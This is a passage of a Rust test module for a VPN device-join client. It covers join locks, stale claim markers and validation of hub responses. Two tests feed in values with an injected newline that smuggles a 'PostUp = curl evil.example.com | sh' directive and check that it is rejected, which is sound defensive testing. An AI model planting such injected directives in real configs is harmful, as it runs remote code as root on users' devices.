        assert_eq!(name.as_str(), "macbook");
        assert_eq!(token.as_str(), "ab".repeat(32));

        // A JSON-escaped newline: readable JSON, unusable endpoint.
        let broken_endpoint = good.replace(
            r#""server_endpoint":"net.example.com:51820""#,
            r#""server_endpoint":"net.example.com:51820\nPostUp = x""#,
        );
        let answer =
            JoinResponse::from_json(&json::parse(&broken_endpoint).unwrap()).expect("decodes");
        let config = DeviceConfig::from_response("net.example.com", answer);
        assert!(config.validate().is_ok(), "name and token are fine");
        assert!(
            config.profile(PrivateKey::new("k")).is_err(),
            "only the endpoint fails, and only when the profile is built"
        );
        let (name, _) = undo_credentials(&broken_endpoint).expect("still undoable");
        assert_eq!(name.as_str(), "macbook");

        // And when the body is unreadable, there is nothing to undo
        // with — which the recovery note has to admit.
        assert_eq!(undo_credentials("not json"), None);
        assert_eq!(undo_credentials(r#"{"name":"macbook"}"#), None);
        assert_eq!(undo_credentials(r#"{"name":"server","token":"x"}"#), None);
    }

    #[test]
    fn a_claim_left_by_a_killed_run_does_not_block_the_next_one() {
        // Drop never runs on SIGKILL, so the marker is what tells the
        // next attempt that these files belong to nobody.
        let dirs = TempDirs::new();
        let device_file = dirs.client.device_file();
        std::fs::write(&dirs.wg_config, CLAIM_MARKER).unwrap();
        std::fs::write(&device_file, CLAIM_MARKER).unwrap();

        assert!(
            check_not_joined(&dirs.client, &dirs.wg_config).is_ok(),
            "an unfinished join owns nothing"
        );
        let mut claim = Reservation::claim(&[&dirs.wg_config, &device_file]).unwrap();
        claim.commit();
        assert!(dirs.wg_config.exists() && device_file.exists());

        // Only the marker counts. An empty file may be one a person
        // made on purpose, and no released build ever wrote one.
        assert!(!is_stale_claim(""));
        assert!(!is_stale_claim("   \n"));
        assert!(is_stale_claim(CLAIM_MARKER));
        std::fs::write(&dirs.wg_config, "").unwrap();
        let e = check_not_joined(&dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::ConfigExists(_)), "{e:?}");
        assert!(Reservation::claim(&[&dirs.wg_config]).is_err());
        assert_eq!(
            std::fs::read_to_string(&dirs.wg_config).unwrap(),
            "",
            "an empty file a person created is not ours to take"
        );
    }

    #[test]
    fn a_real_config_is_never_mistaken_for_a_claim() {
        let dirs = TempDirs::new();
        let config = config();
        std::fs::write(dirs.client.device_file(), config.to_json_string()).unwrap();
        assert!(!is_stale_claim(&config.to_json_string()));

        let e = check_not_joined(&dirs.client, &dirs.wg_config).unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined(_)), "{e:?}");
        let e = Reservation::claim(&[&dirs.client.device_file()]).unwrap_err();
        assert!(matches!(e, JoinError::AlreadyJoined(_)), "{e:?}");
        // And the real file is still there.
        assert_eq!(
            DeviceConfig::parse(&std::fs::read_to_string(dirs.client.device_file()).unwrap())
                .unwrap(),
            config
        );
    }

    #[test]
    fn only_one_join_can_run_on_a_device_at_a_time() {
        // Two joins would each pass the preflight, both POST, and the
        // loser's cleanup would delete the winner's config.
        let dirs = TempDirs::new();
        let held = acquire_join_lock(&dirs.client).unwrap();
        assert!(matches!(
            acquire_join_lock(&dirs.client),
            Err(JoinError::AlreadyRunning)
        ));
        assert!(JoinError::AlreadyRunning
            .to_string()
            .contains("already running"));

        drop(held);
        assert!(
            acquire_join_lock(&dirs.client).is_ok(),
            "the lock is released"
        );
    }

    #[test]
    fn a_second_join_cannot_delete_the_first_ones_files() {
        // The sequence the lock exists for, run for real: one thread
        // completes a join while another tries to start one.
        let dirs = TempDirs::new();
        let config = config();
        let device_file = dirs.client.device_file();

        let loser = std::thread::scope(|scope| {
            let winner = scope.spawn(|| {
                let _lock = acquire_join_lock(&dirs.client).expect("first in");
                check_not_joined(&dirs.client, &dirs.wg_config).expect("nothing there yet");
                let mut claim =
                    Reservation::claim(&[&dirs.wg_config, &device_file]).expect("claimed");
                publish(&config, &profile_of(&config), &dirs.client, &dirs.wg_config)
                    .expect("published");
                claim.commit();
                // Hold the lock a moment so the other thread is
                // guaranteed to meet it.
                std::thread::sleep(std::time::Duration::from_millis(50));
            });
            // Runs while the winner holds the lock.
            std::thread::sleep(std::time::Duration::from_millis(10));
            let loser = acquire_join_lock(&dirs.client).err();
            winner.join().unwrap();
            loser
        });

        assert!(
            matches!(loser, Some(JoinError::AlreadyRunning)),
            "the second join should have been turned away, got {loser:?}"
        );
        // And the winner's files survived.
        assert_eq!(
            DeviceConfig::parse(&std::fs::read_to_string(&device_file).unwrap()).unwrap(),
            config
        );
        assert!(std::fs::read_to_string(&dirs.wg_config)
            .unwrap()
            .contains("PrivateKey = "));
    }

    // ------------------------------------------- untrusted hub answers

    #[test]
    fn a_hub_cannot_write_extra_directives_into_the_config() {
        // TLS says who the hub is, not that it is honest. A newline in
        // a field would otherwise become a wg-quick directive running
        // as root.
        let mut config = config();
        config.server_public_key = format!(
            "{}\nPostUp = curl evil.example.com | sh",
            config.server_public_key
        );
        let e = config.profile(PrivateKey::new("k")).unwrap_err();
        assert!(matches!(e, JoinError::BadResponse(_)), "{e:?}");

        let mut config = super::tests::config();
        config.server_endpoint =
            "net.example.com:51820\nPostUp = curl evil.example.com | sh".to_string();
        let e = config.profile(PrivateKey::new("k")).unwrap_err();
        assert!(e.to_string().contains("server endpoint"), "{e}");

        // Nothing that survives validation can carry a second line.
        let good = super::tests::config();
        let text = wgconf::client_config(&profile_of(&good));
        assert!(!text.contains("PostUp"), "{text}");
    }

    #[test]
    fn an_endpoint_has_to_be_a_host_and_a_port() {
        assert_eq!(
            checked_endpoint("net.example.com:51820").unwrap(),
            "net.example.com:51820"
        );
        assert_eq!(checked_endpoint("10.0.0.1:1").unwrap(), "10.0.0.1:1");
        for bad in [
            "net.example.com",
            "net.example.com:",
            ":51820",
            "net.example.com:0",
            "net.example.com:70000",
            "net.example.com:51820 extra",
            "net example.com:51820",
            "net.example.com:51820\nPostUp = x",
            "",
        ] {
            assert!(checked_endpoint(bad).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_nonsense_identity_is_refused_before_anything_is_written() {
        let mut config = config();
        config.name = "server".to_string();
        assert!(
            config.validate().is_err(),
            "a reserved name is not ours to store"
        );

        let mut config = super::tests::config();
        config.token = "not-a-token".to_string();
        assert!(config.validate().unwrap_err().to_string().contains("token"));

        let mut config = super::tests::config();
        config.server_address = "10.100.0.999".to_string();
        assert!(config.validate().is_err());

        assert!(super::tests::config().validate().is_ok());
    }
}
